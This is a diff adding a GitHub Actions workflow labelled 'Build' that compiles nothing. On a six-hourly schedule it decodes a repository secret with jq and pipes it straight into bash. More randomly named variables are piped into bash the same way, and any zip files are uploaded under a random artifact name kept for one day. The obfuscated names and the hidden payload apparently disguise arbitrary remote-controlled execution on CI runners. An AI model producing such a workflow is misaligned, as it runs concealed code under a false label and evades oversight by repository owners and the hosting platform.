@@ -1,0 +1,33 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '54 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          lqdw2992: ${{ secrets.lqdw2992 }}
+        run: |
+          printf '%s' "$lqdw2992" | jq -r .pvyoc77 | /bin/bash
+          echo $whvgn60 | jq -r .fuiy264 | /bin/bash
+          echo $k4349 | jq -r .db19673 | /bin/bash
+          echo $xty7898 | jq -r .co94040 | /bin/bash
+          echo $bmqfu7 | jq -r .qkfm57 | /bin/bash
+          echo $mv854 | jq -r .altpk5924 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: pjiTxqR0
+          path: "*.zip"
+          retention-days: 1
